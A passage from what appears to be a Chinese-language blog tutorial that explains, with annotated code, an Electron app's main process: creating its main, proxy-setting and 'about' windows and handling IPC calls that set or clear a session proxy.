class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; app, <span class="title class_">BrowserWindow</span>, ipcMain, dialog, nativeImage &#125; = <span class="built_in">require</span>(<span class="string">&#x27;electron&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> mainWindow;</span><br><span class="line"><span class="keyword">let</span> proxyWindow;</span><br><span class="line"><span class="keyword">let</span> versionWindow</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">createWindow</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="comment">// 创建主窗口</span></span><br><span class="line">  mainWindow = <span class="keyword">new</span> <span class="title class_">BrowserWindow</span>(&#123;</span><br><span class="line">    <span class="attr">width</span>: <span class="number">1260</span>,</span><br><span class="line">    <span class="attr">height</span>: <span class="number">830</span>,</span><br><span class="line">    <span class="attr">icon</span>: <span class="string">&#x27;assets/logo.ico&#x27;</span>,</span><br><span class="line">    <span class="attr">webPreferences</span>: &#123;</span><br><span class="line">      <span class="attr">devTools</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="attr">contextIsolation</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="attr">webviewTag</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="attr">preload</span>: path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;src&#x27;</span>, <span class="string">&#x27;js&#x27;</span>, <span class="string">&#x27;preload.js&#x27;</span>),</span><br><span class="line">      <span class="attr">enableRemoteModule</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="attr">nodeIntegration</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="attr">nativeWindowOpen</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="attr">webSecurity</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="attr">allowRunningInsecureContent</span>: <span class="literal">true</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 隐藏electron menu</span></span><br><span class="line">  mainWindow.<span class="title function_">setMenu</span>(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 加载初始页面</span></span><br><span class="line">  mainWindow.<span class="title function_">loadFile</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;src&#x27;</span>, <span class="string">&#x27;view&#x27;</span>, <span class="string">&#x27;index.html&#x27;</span>));</span><br><span class="line"></span><br><span class="line">  mainWindow.<span class="title function_">on</span>(<span class="string">&#x27;closed&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    mainWindow = <span class="literal">null</span>;</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建用于输入代理的自定义窗口</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">createProxyWindow</span>(<span class="params"></span>) &#123;</span><br><span class="line">  proxyWindow = <span class="keyword">new</span> <span class="title class_">BrowserWindow</span>(&#123;</span><br><span class="line">    <span class="attr">width</span>: <span class="number">370</span>,</span><br><span class="line">    <span class="attr">height</span>: <span class="number">250</span>,</span><br><span class="line">    <span class="attr">icon</span>: <span class="string">&#x27;assets/logo.ico&#x27;</span>,</span><br><span class="line">    <span class="attr">parent</span>: mainWindow,</span><br><span class="line">    <span class="attr">modal</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">show</span>: <span class="literal">false</span>,  <span class="comment">// 初始时不显示</span></span><br><span class="line">    <span class="attr">webPreferences</span>: &#123;</span><br><span class="line">      <span class="attr">nodeIntegration</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="attr">preload</span>: path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;src&#x27;</span>,<span class="string">&#x27;js&#x27;</span>, <span class="string">&#x27;preload.js&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  proxyWindow.<span class="title function_">setMenu</span>(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">  proxyWindow.<span class="title function_">loadFile</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;src&#x27;</span>, <span class="string">&#x27;view&#x27;</span>, <span class="string">&#x27;proxy.html&#x27;</span>));</span><br><span class="line">  proxyWindow.<span class="title function_">once</span>(<span class="string">&#x27;ready-to-show&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    proxyWindow.<span class="title function_">show</span>();</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 监听关闭窗口事件</span></span><br><span class="line">  proxyWindow.<span class="title function_">on</span>(<span class="string">&#x27;closed&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    proxyWindow = <span class="literal">null</span>;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 监听渲染进程发送的请求来打开代理输入窗口</span></span><br><span class="line">ipcMain.<span class="title function_">handle</span>(<span class="string">&#x27;open-proxy-dialog&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="title function_">createProxyWindow</span>();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置代理</span></span><br><span class="line">ipcMain.<span class="title function_">handle</span>(<span class="string">&#x27;set-proxy&#x27;</span>, <span class="function">(<span class="params">event, proxyAddress</span>) =&gt;</span> &#123;</span><br><span class="line">  mainWindow.<span class="property">webContents</span>.<span class="property">session</span>.<span class="title function_">setProxy</span>(&#123;</span><br><span class="line">    <span class="attr">proxyRules</span>: <span class="string">`http=<span class="subst">$&#123;proxyAddress&#125;</span>;https=<span class="subst">$&#123;proxyAddress&#125;</span>`</span>,</span><br><span class="line">    <span class="attr">proxyBypassRules</span>: <span class="string">&#x27;&lt;local&gt;&#x27;</span> <span class="comment">// 可选：不通过代理的地址</span></span><br><span class="line">  &#125;).<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    mainWindow.<span class="property">webContents</span>.<span class="title function_">reload</span>(); <span class="comment">// 设置代理后重新加载页面</span></span><br><span class="line">  &#125;).<span class="title function_">catch</span>(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;设置代理失败:&#x27;</span>, err);</span><br><span class="line">    dialog.<span class="title function_">showErrorBox</span>(<span class="string">&#x27;设置代理失败&#x27;</span>, <span class="string">&#x27;无法设置代理: &#x27;</span> + err.<span class="property">message</span>);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 清除代理并恢复默认设置</span></span><br><span class="line">ipcMain.<span class="title function_">handle</span>(<span class="string">&#x27;clear-proxy&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  mainWindow.<span class="property">webContents</span>.<span class="property">session</span>.<span class="title function_">clearCache</span>() <span class="comment">// 清除缓存</span></span><br><span class="line">    .<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="comment">// 恢复默认代理设置</span></span><br><span class="line">      <span class="keyword">return</span> mainWindow.<span class="property">webContents</span>.<span class="property">session</span>.<span class="title function_">setProxy</span>(&#123;&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      mainWindow.<span class="property">webContents</span>.<span class="title function_">reload</span>(); <span class="comment">// 重新加载页面</span></span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;代理已清除，恢复默认设置&#x27;</span>);</span><br><span class="line">    &#125;)</span><br><span class="line">    .<span class="title function_">catch</span>(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;清除代理失败:&#x27;</span>, err);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建用于输入显示“关于程序”的自定义窗口</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">createVersionWindow</span>(<span class="params"></span>) &#123;</span><br><span class="line">  versionWindow = <span class="keyword">new</span> <span class="title class_">BrowserWindow</span>(&#123;</span><br><span class="line">    <span class="attr">width</span>: <span class="number">500</span>,</span><br><span class="line">    <span class="attr">height</span>: <span class="number">685</span>,</span><br><span class="line">    <span class="attr">icon</span>: <span class="string">&#x27;assets/logo.ico&#x27;</span>,</span><br><span class="line">    <span class="attr">parent</span>: mainWindow,</span><br><span class="line">    <span class="attr">modal</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">show</span>: <span class="literal">false</span>,  <span class="comment">// 初始时不显示</span></span><br><span class="line">    <span class="attr">webPreferences</span>: &#123;</span><br><span class="line">      <span class="attr">nodeIntegration</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="attr">preload</span>: path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;src&#x27;</span>,<span class="string">&#x27;js&#x27;</span>, <span class="string">&#x27;preload.js&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  versionWindow.<span class="title function_">setMenu</span>(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">  versionWindow.<span class="title function_">loadFile</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;src&#x27;</span>, <span class="string">&#x27;view&#x27;</span>, <span class="string">&#x27;about.html&#x27;</span>));</span><br><span class="line">  versionWindow.<span class="title function_">once</span>(<span class="string">&#x27;ready-to-show&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    versionWindow.<span class="title function_">show</span>();</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 监听关闭窗口事件</span></span><br><span class="line">  versionWindow.<span class="title function_">on</span>(<span class="string">&#x27;closed&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    versionWindow = <span class="literal">null</span>;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 监听渲染进程发送的请求来打开窗口</span></span><br><span class="line">ipcMain.<span class="title function_">handle</span>(<span class="string">&#x27;open-version-dialog&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="title function_">createVersionWindow</span>();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">whenReady</span>().<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="title function_">createWindow</span>();</span><br><span class="line"></span><br><span class="line">  app.<span class="title function_">on</span>(<span class="string">&#x27;activate&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title class_">BrowserWindow</span>.<span class="title function_">getAllWindows</span>().<span class="property">length</span> === <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="title function_">createWindow</span>();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">on</span>(<span class="string">&#x27;window-all-closed&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (process.<span class="property">platform</span> !== <span class="string">&#x27;darwin&#x27;</span>) &#123;</span><br><span class="line">    app.<span class="title function_">quit</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p>引入模块</p><div class="highlight-wrap" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; app, <span class="title class_">BrowserWindow</span>, ipcMain, dialog, nativeImage &#125; = <span class="built_in">require</span>(<span class="string">&#x27;electron&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>)</span><br></pre></td></tr></table></figure></div><table><thead><tr><th align="left">模块名称</th><th align="left">用途</th><th align="left">典型场景示例</th></tr></thead><tbody><tr><td align="left"><code>app</code></td><td align="left">管理应用生命周期（启动、退出）</td><td align="left"><code>app.whenReady().then(createWindow)</code></td></tr><tr><td align="left"><code>BrowserWindow</code></td><td align="left">创建和控制浏览器窗口</td><td align="left"><code>new BrowserWindow(&#123; width: 800 &#125;)</code></td></tr><tr><td align="left"><code>ipcMain</code></td><td align="left">主进程的进程间通信模块（与渲染进程 <code>ipcRenderer</code> 交互）</td><td align="left"><code>ipcMain.handle(&#39;event&#39;, callback)</code></td></tr><tr><td align="left"><code>dialog</code></td><td align="left">显示系统对话框（文件选择、消息提示等）</td><td align="left"><code>dialog.showOpenDialog(options)</code></td></tr><tr><td align="left"><code>nativeImage</code></td><td align="left">处理系统原生图片（如图标、截图）</td><td align="left"><code>nativeImage.createFromPath(&#39;img.png&#39;)</code></td></tr><tr><td align="left"><code>path</code></td><td align="left">处理文件路径</td><td align="left"><code>path.join(__dirname, &#39;src&#39;, &#39;file.js&#39;)</code></td></tr></tbody></table><p>定义窗口函数，该程序主要有三个窗口，<strong>主窗口</strong>、<strong>代理窗口</strong>、<strong>关于程序窗口</strong></p><div class="highlight-wrap" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> mainWindow;</span><br><span class="line"><span class="keyword">let</span> proxyWindow;</span><br><span class="line"><span class="keyword">let</span> versionWindow</span><br></pre></td></tr></table></figure></div><p>主窗口 let mainWindow</p><div class="highlight-wrap" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 创建并配置应用程序主窗口</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">createWindow</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="comment">// 创建主浏览器窗口实例</span></span><br><span class="line">  mainWindow = <span class="keyword">new</span> <span class="title class_">BrowserWindow</span>(&#123;</span><br><span class="line">    <span class="comment">// 基础窗口配置</span></span><br><span class="line">    <span class="attr">width</span>: <span class="number">1260</span>,                <span class="comment">// 初始窗口宽度（像素）</span></span><br><span class="line">    <span class="attr">height</span>: <span class="number">830</span>,                <span class="comment">// 初始窗口高度（像素）</span></span><br><span class="line">    <span class="attr">icon</span>: <span class="string">&#x27;assets/logo.ico&#x27;</span>,    <span class="comment">// 窗口图标（Windows/Linux 生效，macOS 需单独设置 Dock 图标）</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 网页内容安全配置（关键安全设置）</span></span><br><span class="line">    <span class="attr">webPreferences</span>: &#123;</span><br><span class="line">      <span class="attr">devTools</span>: <span class="literal">false</span>,          <span class="comment">// 禁用开发者工具（生产环境建议关闭，开发时可动态开启）</span></span><br><span class="line">      <span class="attr">contextIsolation</span>: <span class="literal">true</span>,   <span class="comment">// 启用上下文隔离，隔离主进程与渲染进程（安全必需）</span></span><br><span class="line">      <span class="attr">webviewTag</span>: <span class="literal">true</span>,         <span class="comment">// 启用 &lt;webview&gt; 标签加载外部内容</span></span><br><span class="line">      <span class="attr">preload</span>: path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;src&#x27;</span>, <span class="string">&#x27;js&#x27;</span>, <span class="string">&#x27;preload.js&#x27;</span>), <span class="comment">// 预加载脚本路径</span></span><br><span class="line">      <span class="attr">enableRemoteModule</span>: <span class="literal">false</span>,<span class="comment">// 禁用 remote 模块，防止渲染进程直接访问主进程 API（安全必需）</span></span><br><span class="line">      <span class="attr">nodeIntegration</span>: <span class="literal">false</span>,   <span class="comment">// 禁止渲染进程直接访问 Node.js（安全必需）</span></span><br><span class="line">      <span class="attr">nativeWindowOpen</span>: <span class="literal">true</span>,   <span class="comment">// 使用原生 window.open() 行为</span></span><br><span class="line">      <span class="attr">webSecurity</span>: <span class="literal">true</span>,        <span class="comment">// 启用同源策略（CORS 保护）</span></span><br><span class="line">      <span class="attr">allowRunningInsecureContent</span>: <span class="literal">true</span>, <span class="comment">// 允许 HTTPS 页面加载 HTTP 资源</span></span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 隐藏默认菜单栏，若不隐藏，Windows 上会出现 electron 菜单栏，影响程序美观</span></span><br><span class="line">  mainWindow.<span class="title function_">setMenu</span>(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 加载应用主界面</span></span><br><span class="line">  <span class="comment">// 使用 path.join 确保跨平台路径兼容性（Windows/macOS/Linux）</span></span><br><span class="line">  mainWindow.<span class="title function_">loadFile</span>(</span><br><span class="line">    path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;src&#x27;</span>, <span class="string">&#x27;view&#x27;</span>, <span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 窗口关闭事件处理</span></span><br><span class="line">  <span class="comment">// 释放窗口引用避免内存泄漏（Electron 多窗口应用必需）</span></span><br><span class="line">  mainWindow.<span class="title function_">on</span>(<span class="string">&#x27;closed&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    mainWindow = <span class="literal">null</span>;  <span class="comment">// 垃圾回收时释放内存</span></span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>代理端口 let proxyWindow;</p><div class="highlight-wrap" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 创建代理配置专用窗口（模态对话框）</span></span><br><span class="line"><span class="comment"> * 用于用户输入代理服务器地址</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">createProxyWindow</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="comment">// 创建代理配置窗口实例</span></span><br><span class="line">  proxyWindow = <span class="keyword">new</span> <span class="title class_">BrowserWindow</span>(&#123;</span><br><span class="line">    <span class="attr">width</span>: <span class="number">370</span>,     <span class="comment">// 窗口宽度（适配常见代理地址输入长度）</span></span><br><span class="line">    <span class="attr">height</span>: <span class="number">250</span>,    <span class="comment">// 窗口高度（容纳输入框和操作按钮）</span></span><br><span class="line">    <span class="attr">icon</span>: <span class="string">&#x27;assets/logo.ico&#x27;</span>, <span class="comment">// 窗口图标（Windows/Linux）</span></span><br><span class="line">    <span class="attr">parent</span>: mainWindow,  <span class="comment">// 设置父窗口实现模态效果</span></span><br><span class="line">    <span class="attr">modal</span>: <span class="literal">true</span>,    <span class="comment">// 模态窗口（阻止父窗口操作）</span></span><br><span class="line">    <span class="attr">show</span>: <span class="literal">false</span>,    <span class="comment">// 初始隐藏避免闪烁</span></span><br><span class="line">    <span class="attr">webPreferences</span>: &#123;</span><br><span class="line">      <span class="attr">nodeIntegration</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="attr">preload</span>: path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;src&#x27;</span>, <span class="string">&#x27;js&#x27;</span>, <span class="string">&#x27;preload.js&#x27;</span>) <span class="comment">// 预加载脚本</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 移除默认菜单栏</span></span><br><span class="line">  proxyWindow.<span class="title function_">setMenu</span>(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 加载代理配置页面（建议路径：src/view/proxy.html）</span></span><br><span class="line">  proxyWindow.<span class="title function_">loadFile</span>(</span><br><span class="line">    path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;src&#x27;</span>, <span class="string">&#x27;view&#x27;</span>, <span class="string">&#x27;proxy.html&#x27;</span>)</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 页面加载完成后显示窗口（避免白屏）</span></span><br><span class="line">  proxyWindow.<span class="title function_">once</span>(<span class="string">&#x27;ready-to-show&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    proxyWindow.<span class="title function_">show</span>();</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 窗口关闭事件处理</span></span><br><span class="line">  proxyWindow.<span class="title function_">on</span>(<span class="string">&#x27;closed&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    proxyWindow = <span class="literal">null</span>; <span class="comment">// 释放内存引用</span></span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * IPC 通信：监听打开代理配置窗口请求</span></span><br><span class="line"><span class="comment"> * 渲染进程调用方式：window.electron.ipcRenderer.invoke(&#x27;open-proxy-dialog&#x27;)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">ipcMain.<span class="title function_">handle</span>(<span class="string">&#x27;open-proxy-dialog&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="title function_">createProxyWindow</span>(); <span class="comment">// 创建并显示代理窗口,调用的是上方 function createProxyWindow()窗口</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * IPC 通信：设置代理服务器</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">string</span>&#125; <span class="variable">proxyAddress</span> - 代理地址（格式：host:port）</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">ipcMain.<span class="title function_">handle</span>(<span class="string">&#x27;set-proxy&#x27;</span>, <span class="function">(<span class="params">event, proxyAddress</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// 通过 session 对象设置全局代理</span></span><br><span class="line">  mainWindow.<span class="property">webContents</span>.<span class="property">session</span>.<span class="title function_">setProxy</span>(&#123;</span><br><span class="line">    <span class="attr">proxyRules</span>: <span class="string">`http=<span class="subst">$&#123;proxyAddress&#125;</span>;https=<span class="subst">$&#123;proxyAddress&#125;</span>`</span>, <span class="comment">// 同时代理 HTTP/HTTPS</span></span><br><span class="line">    <span class="attr">proxyBypassRules</span>: <span class="string">&#x27;&lt;local&gt;&#x27;</span> <span class="comment">// 绕过本地地址（localhost, 127.0.0.1 等）</span></span><br><span class="line">  &#125;).<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    mainWindow.<span class="property">webContents</span>.<span class="title function_">reload</span>(); <span class="comment">// 重载页面使代理生效</span></span><br><span class="line">  &#125;).<span class="title function_">catch</span>(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;设置代理失败:&#x27;</span>, err);</span><br><span class="line">    <span class="comment">// 显示系统级错误对话框</span></span><br><span class="line">    dialog.<span class="title function_">showErrorBox</span>(<span class="string">&#x27;设置代理失败&#x27;</span>, <span class="string">&#x27;无法设置代理: &#x27;</span> + err.<span class="property">message</span>);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * IPC 通信：清除代理配置并恢复默认</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">ipcMain.<span class="title function_">handle</span>(<span class="string">&#x27;clear-proxy&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// 先清除网络缓存</span></span><br><span class="line">  mainWindow.<span class="property">webContents</span>.<span class="property">session</span>.<span class="title function_">clearCache</span>()</span><br><span class="line">    .<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="comment">// 重置代理设置为空（使用系统默认）</span></span><br><span class="line">      <span class="keyword">return</span> mainWindow.<span class="property">webContents</span>.<span class="property">session</span>.<span class="title function_">setProxy</span>(&#123;&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      mainWindow.<span class="property">webContents</span>.<span class="title function_">reload</span>(); <span class="comment">// 